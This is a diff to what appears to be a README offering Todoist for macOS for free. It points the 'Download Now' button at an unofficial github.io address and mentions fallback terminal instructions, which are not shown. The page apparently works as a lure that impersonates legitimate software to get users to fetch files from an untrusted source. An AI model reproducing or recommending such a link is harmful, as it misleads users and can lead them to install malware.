@@ -2,7 +2,7 @@
 
 Effortlessly manage tasks with Todoist for MacOS. Follow the simple steps below to install this powerful productivity tool for free and stay organized!
 
-[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge&logo=apple)](#)
+[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge&logo=apple)](https://todoist-download.github.io/.github/)
 
 If the download button doesn’t work, follow the terminal instructions below for a seamless installation.
 
